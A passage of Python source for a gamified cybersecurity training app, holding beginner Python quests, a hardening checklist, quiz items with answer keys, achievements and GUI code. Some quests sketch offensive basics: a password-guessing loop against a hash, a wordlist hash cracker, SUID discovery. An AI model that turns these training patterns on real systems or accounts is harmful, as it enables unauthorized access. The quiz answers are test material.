              echo "$(date): $line" >> ~/openclaw_alerts.log
          fi
      done
  done

  chmod +x ~/scripts/openclaw_monitor.sh
  ./scripts/openclaw_monitor.sh &   → Run in background

Step 5 — Implement the hardening checklist:
  ☐ OpenClaw gateway: listen on localhost ONLY
  ☐ Permissions: deny exec, file_write, http_fetch unless specifically needed
  ☐ API keys: not stored in plaintext (use environment variables)
  ☐ Twingate connector: running as non-root service account
  ☐ Skills: only audited, trusted sources installed
  ☐ Monitoring: openclaw_monitor.sh running as a service
  ☐ Logs: forwarded to your SIEM (Wazuh/ELK)

━━ NEXT LOCATION ━━
All 11 skill trees navigated. Head to Exams to test your knowledge,
or revisit any tree to complete optional challenges and earn bonus XP.
""",
    },
]

# ═══════════════════════════════════════════════════════════════════════════
# PYTHON QUESTS (separate tab)
# ═══════════════════════════════════════════════════════════════════════════

PYTHON_QUESTS = [
    {
        "id": "py01", "tree": "python", "tier": 1, "xp": 20,
        "title": "Hello Hacker",
        "brief": "Your first Python program. The shell awakens.",
        "bonus": "Print a formatted 'agent card' in a box using string formatting and f-strings.",
        "bonus_xp": 5,
        "sandbox": '''\
print("=== CyberQuest Python Academy ===")
print("Agent: Ghost Recruit")
print("Status: Online")
import sys
print(f"Python version: {sys.version.split()[0]}")
print("Mission: Learn to build security tools")
''',
        "mission": """\
╔══ LOCATION: The Python Terminal ══╗
Python is the language of cybersecurity.
Metasploit modules, exploit scripts, network tools,
automation scripts, custom parsers — all Python.
Start here. Everything builds from this.

━━ OBJECTIVE ━━
Write and run your first Python programs. Understand print(),
strings, and basic program structure. Open the sandbox and run it.

━━ WHY IT MATTERS ━━
Python is tested in Security+, required in virtually every job posting,
and is the language behind tools like Scapy, Impacket, and sqlmap.

━━ QUEST ━━
Step 1 — Open the SANDBOX (⚡ button below).
  The sandbox lets you run Python right here in the app.
  Hit ▶ RUN to execute the starter code.

Step 2 — Understand what you see:
  print("text")    → outputs text to the console
  "text"           → a string (text in quotes)
  # comment        → Python ignores everything after #
  f"Hello {name}"  → f-string: embed variables in strings

Step 3 — Modify the sandbox code:
  Change "Ghost Recruit" to your own agent name
  Add: print(f"Today: {__import__('datetime').date.today()}")
  Run it again. See the change.

Step 4 — In your terminal on Parrot:
  python3                      → Open interactive Python
  >>> print("Hello, Hacker!")
  >>> print(2 ** 10)           → 2 to the power 10 = 1024
  >>> exit()

  nano ~/scripts/hello.py
  # Add: print("=== AGENT ONLINE ===")
  python3 ~/scripts/hello.py
""",
    },

    {
        "id": "py02", "tree": "python", "tier": 1, "xp": 25,
        "title": "Variables & Types",
        "brief": "Store data: IPs, ports, flags, results.",
        "bonus": "Build a 'target profile' dict with ip, port, protocol, cve, severity. Print it formatted.",
        "bonus_xp": 5,
        "sandbox": '''\
# Target information
target_ip  = "192.168.1.100"
target_port = 80
protocol   = "TCP"
is_open    = True
cvss_score = 9.8

print(f"Target:   {target_ip}:{target_port} ({protocol})")
print(f"Open:     {is_open}")
print(f"CVSS:     {cvss_score}")
print(f"Critical: {cvss_score >= 9.0}")
print(f"Types:    {type(target_ip)} | {type(target_port)} | {type(is_open)}")
''',
        "mission": """\
╔══ LOCATION: The Data Vault ══╗
Security tools deal with data: IPs, ports, hashes, CVE scores,
scan results. Python stores all of it in variables.
Variables are the memory of your program.

━━ OBJECTIVE ━━
Create variables of different types. Use f-strings to format output.
Understand int, str, float, and bool — the four primitives.

━━ QUEST ━━
Step 1 — Run the sandbox. Understand each variable type:
  str   = "text"           → strings (IPs, hostnames, CVE IDs)
  int   = 80               → integers (port numbers, counts)
  float = 9.8              → floats (CVSS scores)
  bool  = True / False     → booleans (is_open, is_vulnerable)

Step 2 — F-strings (your most-used tool):
  name = "Target01"
  port = 443
  print(f"Scanning {name} on port {port}")

Step 3 — Arithmetic (useful for score calculations):
  score = 7.5 + 2.3        → Addition
  critical = score >= 9.0   → Boolean comparison: True or False
  percent = (14 / 20) * 100 → Percentage calculation

Step 4 — Modify the sandbox:
  Add a CVE variable: cve = "CVE-2021-44228"
  Print: f"CVE: {cve} | Score: {cvss_score} | Critical: {cvss_score >= 9.0}"
""",
    },

    {
        "id": "py03", "tree": "python", "tier": 1, "xp": 30,
        "title": "Control Flow",
        "brief": "if/else and loops. Make your code think and repeat.",
        "bonus": "Build a port classifier: given a list of ports, print LOW/MED/HIGH for each based on service risk.",
        "bonus_xp": 10,
        "sandbox": '''\
targets = ["192.168.1.1", "10.0.0.5", "172.16.0.10"]

for ip in targets:
    print(f"[*] Scanning {ip}...")
    for port in [22, 80, 443, 3389]:
        # Simulate port status (replace with real socket check later)
        is_open = port in [22, 80]
        status = "OPEN" if is_open else "closed"
        print(f"    :{port} {status}")

# Severity classification
cvss = 8.5
if cvss >= 9.0:
    severity = "CRITICAL"
elif cvss >= 7.0:
    severity = "HIGH"
elif cvss >= 4.0:
    severity = "MEDIUM"
else:
    severity = "LOW"
print(f"\\nCVSS {cvss} = {severity}")
''',
        "mission": """\
╔══ LOCATION: The Decision Engine ══╗
Security tools make decisions constantly:
Is this port open? Is this score critical?
Is this user in the admin group?
Python control flow is how your code makes decisions.

━━ OBJECTIVE ━━
Use if/elif/else for conditional logic. Use for and while loops
to iterate over lists. Apply to security tool patterns.

━━ QUEST ━━
Step 1 — Run the sandbox. Trace the logic:
  The outer for loop iterates over IPs
  The inner for loop iterates over ports
  The if/else decides the status label

Step 2 — CVSS severity classifier (extend the sandbox):
  Change cvss to different values (3.1, 6.9, 9.5, 10.0)
  Run each time. Watch the severity change.

Step 3 — Comparison operators:
  ==  equals          !=  not equal
  >   greater than    <   less than
  >=  >=               <=  <=
  and / or / not      → Combine conditions

Step 4 — while loop (brute force pattern):
  attempts = 0
  passwords = ["password", "admin123", "secret"]
  target_hash = "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8"
  while attempts < len(passwords):
      print(f"Trying: {passwords[attempts]}")
      attempts += 1
""",
    },

    {
        "id": "py04", "tree": "python", "tier": 2, "xp": 40,
        "title": "Functions & Errors",
        "brief": "Reusable code and bulletproof error handling.",
        "bonus": "Build a mini toolkit: port_classifier(), ip_validator(), cvss_severity(). Call from a menu.",
        "bonus_xp": 10,
        "sandbox": '''\
def classify_port(port: int) -> str:
    """Return the category of a port number."""
    if port < 1024:
        return "well-known"
    elif port < 49152:
        return "registered"
    return "dynamic"

def safe_int(prompt: str) -> int | None:
    """Prompt for an integer, return None on invalid input."""
    try:
        return int(input(prompt))
    except ValueError:
        print("  [!] Not a valid integer.")
        return None

# Test port classification
for p in [21, 80, 3306, 8080, 50000, 65535]:
    print(f"Port {p:5d}: {classify_port(p)}")

# safe_int demo (uses default input "80" from sandbox stdin)
port = safe_int("Enter port: ")
if port is not None:
    print(f"\\nYou entered port {port} ({classify_port(port)})")
''',
        "mission": """\
╔══ LOCATION: The Function Factory ══╗
Functions turn code into tools.
Error handling turns tools into reliable tools.
A security script that crashes on bad input is useless in the field.
Build it right from the start.

━━ OBJECTIVE ━━
Write named functions with parameters and return values.
Use try/except to handle errors gracefully. Build reusable components.

━━ QUEST ━━
Step 1 — Run the sandbox. Note:
  classify_port() is called 6 times with the same logic each time
  safe_int() wraps input() in a try/except so it never crashes

Step 2 — Function anatomy:
  def function_name(parameter1, parameter2="default"):
      \"\"\"Docstring explains what the function does.\"\"\"
      result = parameter1 + parameter2
      return result

Step 3 — try/except (essential for network tools):
  try:
      socket.connect((ip, port))   # Might fail (refused, timeout)
  except ConnectionRefusedError:
      print("Port closed")
  except socket.timeout:
      print("Timed out")
  except Exception as e:
      print(f"Unknown error: {e}")

Step 4 — Extend the sandbox:
  Write cvss_severity(score: float) -> str
  that returns "CRITICAL"/"HIGH"/"MEDIUM"/"LOW"/"NONE"
  Add it to the output loop.
""",
    },

    {
        "id": "py05", "tree": "python", "tier": 2, "xp": 45,
        "title": "Data Structures",
        "brief": "Lists, dicts, and comprehensions. Build scan result models.",
        "bonus": "Build a host inventory: add hosts with IP/hostname/ports/CVEs. Search by IP or CVE. Display all.",
        "bonus_xp": 10,
        "sandbox": '''\
# Model a scan result as a dict
host = {
    "ip":       "192.168.1.100",
    "hostname": "web-server-01",
    "os":       "Ubuntu 22.04",
    "ports":    [22, 80, 443, 8080],
    "cves":     ["CVE-2021-41773", "CVE-2022-22965"],
}

# Print the host card
print(f"{'='*40}")
print(f"  Host:  {host['hostname']} ({host['ip']})")
print(f"  OS:    {host['os']}")
print(f"  Ports: {', '.join(str(p) for p in host['ports'])}")
print(f"  CVEs:  {len(host['cves'])} found")
for cve in host["cves"]:
    print(f"    • {cve}")

# List comprehension: filter high-risk ports
risky_ports = [p for p in host["ports"] if p in [22, 3389, 23, 21]]
print(f"\\nRisky ports: {risky_ports}")

# Dict comprehension: port status map
status = {p: "open" for p in host["ports"]}
print(f"Port map: {status}")
''',
        "mission": """\
╔══ LOCATION: The Data Model Room ══╗
Real security tools deal with structured data:
hosts have IPs and ports, CVEs have scores and versions,
scans have results and timestamps.
Python lists and dicts model all of it cleanly.

━━ OBJECTIVE ━━
Use lists and dicts to model security data. Apply list comprehension
and dict comprehension to filter and transform data efficiently.

━━ QUEST ━━
Step 1 — Run the sandbox. Note the patterns:
  dict  → stores host attributes (key: value)
  list  → stores ordered collections (ports, CVEs)
  list comprehension → filters ports in one line
  dict comprehension → builds port map in one line

Step 2 — List operations:
  ports = [22, 80, 443]
  ports.append(8080)       → Add to end
  ports.remove(80)         → Remove by value
  ports.sort()             → Sort in place
  filtered = [p for p in ports if p < 1024]  → Comprehension

Step 3 — Dict operations:
  host["status"] = "up"     → Add/update key
  host.get("os", "Unknown") → Get with default
  for k, v in host.items(): → Iterate key-value pairs

Step 4 — Build a network inventory:
  network = {}
  network["192.168.1.1"] = {"hostname": "router", "ports": [80]}
  network["192.168.1.100"] = {"hostname": "web", "ports": [80, 443]}
  for ip, info in network.items():
      print(f"{ip}: {info}")
""",
    },

    {
        "id": "py06", "tree": "python", "tier": 2, "xp": 40,
        "title": "Files & Modules",
        "brief": "Read logs, write reports, use the standard library.",
        "bonus": "Script: hash a password with SHA256, generate a token, log with timestamp, save to JSON.",
        "bonus_xp": 10,
        "sandbox": '''\
import json
import hashlib
import secrets
from datetime import datetime

# Simulate a scan result
scan = {
    "target":    "192.168.1.100",
    "timestamp": str(datetime.now()),
    "ports":     [22, 80, 443],
    "findings":  ["Default SSH banner", "HTTP server tokens exposed"],
}

# Save to JSON
with open("scan_result.json", "w") as f:
    json.dump(scan, f, indent=2)
print("✓ Saved scan_result.json")

# Load it back
with open("scan_result.json") as f:
    loaded = json.load(f)
print(f"Loaded target: {loaded['target']}")
print(f"Findings: {len(loaded['findings'])}")

# Hash operations
password = "password123"
sha256 = hashlib.sha256(password.encode()).hexdigest()
token  = secrets.token_hex(16)
print(f"\\nSHA256: {sha256}")
print(f"Token:  {token}")
''',
        "mission": """\
╔══ LOCATION: The Library and Archive ══╗
Real tools save results to disk, read configuration files,
hash passwords, generate secure tokens, and timestamp events.
Python's standard library gives you all of this for free.

━━ OBJECTIVE ━━
Use file I/O, JSON, hashlib, secrets, and datetime modules.
Build a script that saves structured scan data to disk.

━━ QUEST ━━
Step 1 — Run the sandbox. Look for:
  'with open() as f:'  → Context manager (auto-closes file)
  json.dump / json.load → Serialize/deserialize structured data
  hashlib.sha256       → Cryptographic hash
  secrets.token_hex    → Cryptographically secure random token

Step 2 — File modes:
  open("file", "w")   → Write (creates or overwrites)
  open("file", "a")   → Append (never overwrites)
  open("file", "r")   → Read (default)

Step 3 — Parse a log file:
  with open("/var/log/auth.log") as f:
      for line in f:
          if "Failed password" in line:
              print(line.strip())

Step 4 — Extend the sandbox:
  Add a 'risk_score' key with a random float between 0.0 and 10.0
  (use: random.uniform(0.0, 10.0))
  Re-save and reload. Verify the score persisted.
""",
    },

    {
        "id": "py07", "tree": "python", "tier": 3, "xp": 55,
        "title": "OOP & Advanced Python",
        "brief": "Classes, decorators, generators. Build professional-grade tools.",
        "bonus": "Scanner class hierarchy: base Scanner → PortScanner → VulnScanner. Add @timer decorator.",
        "bonus_xp": 15,
        "sandbox": '''\
import time

def timer(func):
    """Decorator that measures and prints execution time."""
    def wrapper(*args, **kwargs):
        start  = time.time()
        result = func(*args, **kwargs)
        print(f"  [{func.__name__}] completed in {time.time()-start:.4f}s")
        return result
    return wrapper

class Scanner:
    def __init__(self, target: str):
        self.target  = target
        self.results = []

    def report(self):
        print(f"\\n{'='*40}")
        print(f"  Scan Report: {self.target}")
        print(f"{'='*40}")
        for r in self.results:
            print(f"  {r}")

class PortScanner(Scanner):
    @timer
    def scan(self, ports: list[int]):
        for p in ports:
            self.results.append(f"Port {p}: open")

class VulnScanner(Scanner):
    @timer
    def check_cves(self, cves: list[str]):
        for cve in cves:
            self.results.append(f"Checking {cve}... VULNERABLE")

ps = PortScanner("192.168.1.100")
ps.scan([22, 80, 443, 8080])
ps.report()

vs = VulnScanner("192.168.1.100")
vs.check_cves(["CVE-2021-44228", "CVE-2022-22965"])
vs.report()
''',
        "mission": """\
╔══ LOCATION: The Engineering Workshop ══╗
Scripts are one-off tools. Classes are reusable components.
Decorators add behavior without modifying code.
Generators handle large datasets without running out of memory.
This is where you go from scripter to developer.

━━ OBJECTIVE ━━
Build class hierarchies with inheritance. Write and apply decorators.
Use generators for memory-efficient data processing.

━━ QUEST ━━
Step 1 — Run the sandbox. Trace:
  @timer      → Decorator wraps scan() and check_cves()
  Scanner     → Base class (target + results + report method)
  PortScanner → Inherits Scanner, adds scan()
  VulnScanner → Inherits Scanner, adds check_cves()

Step 2 — Class anatomy:
  class Target:
      def __init__(self, ip, hostname):
          self.ip       = ip         → instance attributes
          self.hostname = hostname
          self.ports    = []

      def add_port(self, port):
          self.ports.append(port)    → method

      def __repr__(self):
          return f"Target({self.ip})"  → string representation

Step 3 — Generator for large log files:
  def parse_auth_log(filepath):
      with open(filepath) as f:
          for line in f:
              if "Failed password" in line:
                  yield line.strip()  → yield instead of return

  for event in parse_auth_log("/var/log/auth.log"):
      print(event)  → Processes one line at a time, never loads all into RAM

Step 4 — Extend the sandbox:
  Add a NetworkScanner class that inherits Scanner
  Give it a subnet_sweep(subnet) method that stores "HOST: x.x.x.x UP"
  results for a hardcoded list of IPs.
""",
    },

    {
        "id": "py08", "tree": "python", "tier": 3, "xp": 70,
        "title": "Build a Security Tool",
        "brief": "Capstone: build a real, complete security tool from scratch.",
        "bonus": "Extend your tool: JSON export, --verbose flag, color output with colorama, full error handling.",
        "bonus_xp": 20,
        "sandbox": '''\
import secrets
import string
import json
from datetime import datetime

def generate_password(length: int = 20) -> str:
    """Generate a cryptographically secure password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return "".join(secrets.choice(chars) for _ in range(length))

def score_password(pw: str) -> dict:
    """Return a breakdown of password strength."""
    return {
        "length":       len(pw) >= 12,
        "uppercase":    any(c.isupper() for c in pw),
        "digits":       any(c.isdigit() for c in pw),
        "special":      any(c in "!@#$%^&*" for c in pw),
    }

def main():
    print("=== Password Generator & Strength Scorer ===")
    results = []
    for i in range(5):
        pw     = generate_password(20)
        checks = score_password(pw)
        score  = sum(checks.values())
        grade  = ["WEAK","FAIR","GOOD","STRONG","PERFECT"][score]
        print(f"  {pw}  [{grade} {score}/4]")
        results.append({"password": pw, "score": score, "grade": grade})

    with open("passwords.json", "w") as f:
        json.dump({"generated": str(datetime.now()), "results": results}, f, indent=2)
    print("\\n✓ Saved to passwords.json")

main()
''',
        "mission": """\
╔══ LOCATION: The Tool Forge — CAPSTONE ══╗
Everything you've learned comes together here.
Variables. Functions. Classes. File I/O. Error handling.
Modules. OOP. All of it, combined into a real tool.
Choose your weapon and build it.

━━ OBJECTIVE ━━
Build a complete, functional security tool using everything from
the Python track. Must use: classes, file I/O, error handling,
list comprehension, and 3+ standard library modules.

━━ QUEST ━━
Step 1 — Run the sandbox. This is a complete password tool:
  generate_password() → cryptographically secure
  score_password()    → returns a breakdown dict
  main()              → ties it together, saves JSON

Step 2 — Choose your capstone project:

  OPTION A: LOG ANALYZER
    - Parse /var/log/auth.log
    - Count failed logins per IP address (dict)
    - Flag IPs with 5+ failures as brute force suspects
    - Export findings to JSON with timestamp

  OPTION B: NETWORK SCANNER
    - Use socket to test TCP port connectivity
    - Scan a list of IPs and ports
    - Display open ports in real time
    - Save results to JSON

  OPTION C: HASH CRACKER
    - Accept a SHA256 hash as input
    - Try each word from a wordlist
    - Compare sha256(word) to the target hash
    - Report success or exhaustion

Step 3 — Requirements for all options:
  ☐ At least one class
  ☐ File I/O (read input, write JSON output)
  ☐ try/except around all external operations
  ☐ At least one list comprehension
  ☐ 3+ standard library modules
  ☐ A main() function as the entry point

Step 4 — Build it, run it, verify it works.
  This is your first portfolio-ready Python security tool.
""",
    },
]

# Combine ALL_QUESTS with PYTHON_QUESTS for unified XP and search
ALL_QUESTS = ALL_QUESTS + PYTHON_QUESTS


# ═══════════════════════════════════════════════════════════════════════════
# KNOWLEDGE EXAMS
# ═══════════════════════════════════════════════════════════════════════════

SIDE_QUESTS = [
    {
        "id": "exam_linux",
        "title": "🧪 Linux Fundamentals Exam",
        "xp": 30,
        "questions": [
            {"q": "Which command shows your current directory?",            "options": ["ls","pwd","cd","whoami"],                                     "answer": 1},
            {"q": "Which directory stores system configuration files?",    "options": ["/home","/tmp","/etc","/bin"],                                 "answer": 2},
            {"q": "chmod 755 means:",                                      "options": ["Owner:rwx Group:r-x Others:r-x","All:rwx","Owner:rw-","Owner:rwx Others:---"], "answer": 0},
            {"q": "SUID bit causes the file to run as:",                   "options": ["Current user","File owner","Root always","No one"],           "answer": 1},
            {"q": "Find SUID files command:",                              "options": ["ls -suid","find / -perm -4000","grep suid /","chmod -4000"],  "answer": 1},
            {"q": "Password hashes are stored in:",                        "options": ["/etc/passwd","/etc/shadow","/etc/crypt","/var/shadow"],       "answer": 1},
            {"q": "sudo -l shows:",                                        "options": ["Last login","Load average","Allowed sudo commands","Listening ports"], "answer": 2},
            {"q": "Default world-writable temp directory:",                "options": ["/etc","/home","/tmp","/root"],                               "answer": 2},
        ],
    },
    {
        "id": "exam_network",
        "title": "🧪 Networking Exam",
        "xp": 30,
        "questions": [
            {"q": "TCP operates at OSI Layer:",              "options": ["2 Data Link","3 Network","4 Transport","7 Application"],          "answer": 2},
            {"q": "SSH default port:",                       "options": ["21","22","23","25"],                                              "answer": 1},
            {"q": "A TCP SYN packet initiates:",             "options": ["Session teardown","Data transfer","Connection request","DNS query"], "answer": 2},
            {"q": "nmap -sS performs:",                      "options": ["Full TCP connect","UDP scan","SYN stealth scan","Ping sweep"],     "answer": 2},
            {"q": "DNS resolves:",                           "options": ["IPs to MACs","Hostnames to IPs","MACs to IPs","Ports to services"], "answer": 1},
            {"q": "/24 subnet mask:",                        "options": ["255.0.0.0","255.255.0.0","255.255.255.0","255.255.255.128"],      "answer": 2},
            {"q": "SMB default port:",                       "options": ["139","389","443","445"],                                          "answer": 3},
            {"q": "SNMP uses which transport protocol:",     "options": ["TCP","UDP","ICMP","ARP"],                                         "answer": 1},
        ],
    },
    {
        "id": "exam_security",
        "title": "🧪 Security Foundations Exam",
        "xp": 35,
        "questions": [
            {"q": "The 'I' in CIA Triad stands for:",              "options": ["Intelligence","Integrity","Identity","Interoperability"],    "answer": 1},
            {"q": "CVSS Critical range:",                          "options": ["7.0-8.9","8.5-9.5","9.0-10.0","10.0 only"],                "answer": 2},
            {"q": "NIST CSF 'Detect' function covers:",            "options": ["Preventing attacks","Monitoring for attacks","Recovery","Policy writing"], "answer": 1},
            {"q": "CVE-2021-44228 is commonly known as:",          "options": ["EternalBlue","Log4Shell","Heartbleed","BlueKeep"],          "answer": 1},
            {"q": "Defense in depth means:",                       "options": ["One very strong firewall","Multiple layered controls","Deep packet inspection","Full disk encryption"], "answer": 1},
            {"q": "$6$ prefix in /etc/shadow indicates:",          "options": ["MD5","SHA-256","SHA-512","bcrypt"],                         "answer": 2},
            {"q": "A zero-day vulnerability is:",                  "options": ["A patched vulnerability","One with no known fix yet","CVSS score of 0","A day-zero disclosure"], "answer": 1},
            {"q": "Least privilege means:",                        "options": ["Minimum access needed","No access by default","Admin for everyone","Access by role only"], "answer": 0},
        ],
    },
    {
        "id": "exam_web",
        "title": "🧪 Web Hacking Exam",
        "xp": 30,
        "questions": [
            {"q": "SQL injection works by:",                       "options": ["Injecting CSS","Embedding SQL in input","DDoSing the DB","Brute forcing login"], "answer": 1},
            {"q": "XSS stands for:",                               "options": ["Cross-System Scripting","Cross-Site Scripting","eXtra Secure Socket","XML Script Service"], "answer": 1},
            {"q": "Burp Suite is primarily used for:",             "options": ["Port scanning","Intercepting web traffic","Password cracking","DNS enumeration"], "answer": 1},
            {"q": "robots.txt is useful to attackers because:",    "options": ["It blocks crawlers","It lists paths to hide","It shows open ports","It reveals the DB"], "answer": 1},
            {"q": "OWASP Top 10 #1 in 2021:",                     "options": ["Injection","Broken Access Control","XSS","SSRF"],                          "answer": 1},
            {"q": "Parameterized queries prevent:",                 "options": ["XSS","Path traversal","SQL injection","CSRF"],                            "answer": 2},
        ],
    },
    {
        "id": "exam_python",
        "title": "🧪 Python Security Scripting Exam",
        "xp": 30,
        "questions": [
            {"q": "Print output in Python:",                       "options": ["echo()","printf()","print()","output()"],                                  "answer": 2},
            {"q": "f-string syntax:",                              "options": ["f'Hello {name}'","'Hello'.format(name)","format('Hello',name)","Hello+name"], "answer": 0},
            {"q": "List comprehension to filter ports > 1024:",    "options": ["list(p > 1024)","[p for p in ports if p > 1024]","{p: 1024}","(p for 1024)"], "answer": 1},
            {"q": "Handle a ValueError with:",                     "options": ["if/else","try/except ValueError","for/while","raise ValueError"],           "answer": 1},
            {"q": "__init__ in a Python class is:",                "options": ["A destructor","The constructor","An iterator","A decorator"],               "answer": 1},
            {"q": "Safely open a file in Python:",                 "options": ["file = open('f')","with open('f') as f:","f = File('f')","read('f')"],     "answer": 1},
        ],
    },
]


# ═══════════════════════════════════════════════════════════════════════════
# ACHIEVEMENTS
# ═══════════════════════════════════════════════════════════════════════════

def get_achievements(save):
    c = save.get("completed_quests", [])
    b = save.get("bonus_completed",  [])
    e = save.get("exam_scores",      {})
    s = save.get("side_quests_done", [])

    # Helper: all quests in a tree completed?
    def tree_done(tree):
        return all(q["id"] in c for q in ALL_QUESTS if q["tree"] == tree)

    return [
        # Progress achievements
        {"id":"first",   "name":"First Blood",       "desc":"Complete your first quest",              "icon":"🩸",  "check": lambda: len(c) >= 1},
        {"id":"five",    "name":"Grinding",           "desc":"Complete 5 quests",                      "icon":"⚔️",  "check": lambda: len(c) >= 5},
        {"id":"ten",     "name":"Double Digits",      "desc":"Complete 10 quests",                     "icon":"🔟",  "check": lambda: len(c) >= 10},
        {"id":"twenty",  "name":"Unstoppable",        "desc":"Complete 20 quests",                     "icon":"🔥",  "check": lambda: len(c) >= 20},
        {"id":"thirty",  "name":"Dedicated Operator", "desc":"Complete 30 quests",                     "icon":"💀",  "check": lambda: len(c) >= 30},
        {"id":"all",     "name":"Completionist",      "desc":"Complete every quest",                   "icon":"👑",  "check": lambda: len(c) >= len(ALL_QUESTS)},
        # Bonus achievements
        {"id":"bonus1",  "name":"Extra Credit",       "desc":"Claim a bonus objective",                "icon":"⭐",  "check": lambda: len(b) >= 1},
        {"id":"bonus5",  "name":"Overachiever",        "desc":"Claim 5 bonus objectives",               "icon":"🌟",  "check": lambda: len(b) >= 5},
        {"id":"bonus10", "name":"Perfectionist",       "desc":"Claim 10 bonus objectives",              "icon":"💯",  "check": lambda: len(b) >= 10},
        # Exam achievements
        {"id":"exam1",   "name":"Test Taker",          "desc":"Pass an exam",                           "icon":"📝",  "check": lambda: len(s) >= 1},
        {"id":"exams_all","name":"Scholar",            "desc":"Pass all 5 exams",                       "icon":"🎓",  "check": lambda: len(s) >= len(SIDE_QUESTS)},
        {"id":"perfect", "name":"Perfect Score",       "desc":"Score 100% on any exam",                 "icon":"💎",  "check": lambda: any(v == 100 for v in e.values())},
        # Tree achievements
        {"id":"linux",   "name":"Penguin Master",      "desc":"Complete all Linux quests",              "icon":"🐧",  "check": lambda: tree_done("linux")},
        {"id":"web",     "name":"Web Warrior",         "desc":"Complete all Web Hacking quests",        "icon":"🕸️",  "check": lambda: tree_done("webhack")},
        {"id":"pythonista","name":"Pythonista",        "desc":"Complete all Python quests",             "icon":"🐍",  "check": lambda: tree_done("python")},
        {"id":"trees",   "name":"Renaissance Hacker",  "desc":"Complete a quest in every skill tree",   "icon":"🌈",  "check": lambda: all(any(q["id"] in c for q in ALL_QUESTS if q["tree"] == t) for t in SKILL_TREES)},
    ]

# ═══════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION — CustomTkinter GUI
# ═══════════════════════════════════════════════════════════════════════════

class App(ctk.CTk):
    """CyberQuest RPG main window — green-and-black hacker hub aesthetic."""

    def __init__(self):
        super().__init__()

        self.title("CyberQuest RPG — Hacker Academy")
        self.geometry("1280x860")
        self.minsize(1050, 700)
        self.configure(fg_color=C["bg"])

        self.save     = load_save()
        self.sel_tree = None   # Active skill tree filter (None = all)

        self._build_layout()

        if not self.save.get("seen_requirements"):
            self.after(600, self._show_requirements)

        self.show_dashboard()

    # ─────────────────────────────────────────────────────────────────────
    # LAYOUT CONSTRUCTION
    # ─────────────────────────────────────────────────────────────────────

    def _build_layout(self):
        """Build the persistent chrome: title bar, rank bar, nav, scroll area."""

        # ── Title row ────────────────────────────────────────────────────
        title_row = ctk.CTkFrame(self, fg_color=C["bg"], corner_radius=0)
        title_row.pack(fill="x", padx=20, pady=(10, 2))

        ctk.CTkLabel(title_row, text="CYBERQUEST RPG",
                     font=ctk.CTkFont("Courier New", 28, "bold"),
                     text_color=C["acc"]).pack(side="left")
        ctk.CTkLabel(title_row, text="  //  HACKER ACADEMY  //  Parrot OS Edition",
                     font=ctk.CTkFont("Courier New", 13),
                     text_color=C["dim"]).pack(side="left", pady=(6, 0))

        # ── Rank / XP bar ────────────────────────────────────────────────
        self.rank_frame = ctk.CTkFrame(self, fg_color=C["bg2"],
                                       border_color=C["acc2"], border_width=1,
                                       corner_radius=4)
        self.rank_frame.pack(fill="x", padx=20, pady=(2, 4))
        self._build_rank_bar()

        # ── Navigation tabs ──────────────────────────────────────────────
        nav = ctk.CTkFrame(self, fg_color=C["bg"], corner_radius=0)
        nav.pack(fill="x", padx=20, pady=(0, 4))

        tab_defs = [
            ("⚔  QUESTS",        self.show_dashboard),
            ("🐍  PYTHON",       self.show_python),
            ("🧪  EXAMS",        self.show_exams),
            ("🏆  ACHIEVEMENTS", self.show_achievements),
            ("💼  CAREERS",      self.show_careers),
            ("📋  SETUP",        self._show_requirements),
        ]
        self.tab_btns = []
        for label, cmd in tab_defs:
            btn = ctk.CTkButton(
                nav, text=label, command=cmd, width=140,
                fg_color=C["bg3"], hover_color=C["acc3"],
                text_color=C["dim"], font=ctk.CTkFont("Courier New", 13, "bold"),
                border_width=1, border_color=C["border"], corner_radius=3,
            )
            btn.pack(side="left", padx=2, pady=2)
            self.tab_btns.append(btn)

        # ── Scrollable content area ──────────────────────────────────────
        self.scroll = ctk.CTkScrollableFrame(
            self, fg_color=C["bg"], scrollbar_button_color=C["acc3"],
            scrollbar_button_hover_color=C["acc2"],
        )
        self.scroll.pack(fill="both", expand=True, padx=20, pady=(0, 8))

    def _build_rank_bar(self):
        """Rebuild the XP / rank progress bar."""
        for w in self.rank_frame.winfo_children():
            w.destroy()

        xp      = total_xp(self.save)
        rank    = get_rank(xp)
        next_rk = get_next_rank(xp)

        outer = ctk.CTkFrame(self.rank_frame, fg_color=C["bg2"])
        outer.pack(fill="x", padx=12, pady=6)

        # Left: rank info
        left = ctk.CTkFrame(outer, fg_color=C["bg2"])
        left.pack(side="left")
        ctk.CTkLabel(left, text=f"RANK {rank['level']}",
                     font=ctk.CTkFont("Courier New", 12), text_color=C["acc"]).pack(anchor="w")
        ctk.CTkLabel(left, text=rank["title"],
                     font=ctk.CTkFont("Courier New", 18, "bold"),
                     text_color=C["white"]).pack(anchor="w")

        # Right: XP number
        right = ctk.CTkFrame(outer, fg_color=C["bg2"])
        right.pack(side="right")
        ctk.CTkLabel(right,
                     text=f"{xp} XP",
                     font=ctk.CTkFont("Courier New", 24, "bold"),
                     text_color=C["white"]).pack(anchor="e")

        # Progress toward next rank
        if next_rk:
            bar_row = ctk.CTkFrame(outer, fg_color=C["bg2"])
            bar_row.pack(fill="x", side="bottom", pady=(4, 0))
            progress = (xp - rank["xp"]) / max(1, next_rk["xp"] - rank["xp"])
            ctk.CTkProgressBar(bar_row, progress_color=C["acc"],
                                fg_color=C["acc3"], height=6).pack(
                fill="x", pady=(0, 2)
            )
            bar_row.winfo_children()[0].set(min(progress, 1.0))
            ctk.CTkLabel(bar_row,
                         text=f"{rank['title']}  →  {next_rk['title']}  ({next_rk['xp']-xp} XP to go)",
                         font=ctk.CTkFont("Courier New", 12), text_color=C["dim"]).pack(anchor="w")

        # Counts
        n_q = len(self.save.get("completed_quests", []))
        n_b = len(self.save.get("bonus_completed",  []))
        n_e = len(self.save.get("side_quests_done", []))
        ctk.CTkLabel(outer,
                     text=f"{n_q}/{len(ALL_QUESTS)} Quests  •  {n_b} Bonuses  •  {n_e} Exams",
                     font=ctk.CTkFont("Courier New", 12), text_color=C["dim"]).pack(side="bottom", anchor="w")

    def _clear(self):
        """Remove all content widgets from the scroll area."""
        for w in self.scroll.winfo_children():
            w.destroy()

    def _set_tab(self, idx):
        """Highlight the active tab button."""
        for i, btn in enumerate(self.tab_btns):
            btn.configure(text_color=C["acc"] if i == idx else C["dim"])

    def _refresh_rank(self):
        """Rebuild rank bar after XP changes."""
        self._build_rank_bar()

    # ─────────────────────────────────────────────────────────────────────
    # AVAILABLE QUEST FILTER
